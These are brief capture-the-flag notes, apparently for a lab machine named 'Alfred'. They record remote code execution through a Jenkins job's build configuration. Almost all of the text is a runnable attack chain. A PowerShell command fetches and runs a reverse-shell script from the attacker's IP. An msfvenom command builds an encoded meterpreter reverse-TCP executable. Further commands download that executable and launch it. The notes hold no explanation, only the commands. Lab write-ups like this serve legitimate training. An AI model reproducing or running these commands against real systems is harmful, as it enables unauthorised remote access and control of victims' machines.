# Alfred

http://10.10.200.120:8080/job/project/configure give RCE with `powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.2.226:9999/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.2.226 -Port 4444` under build.

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.2.226 LPORT=4443 -f exe -o shell.exe`

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.2.226:9999/shell.exe','shell.exe')"`

`Start-Process "shell.exe`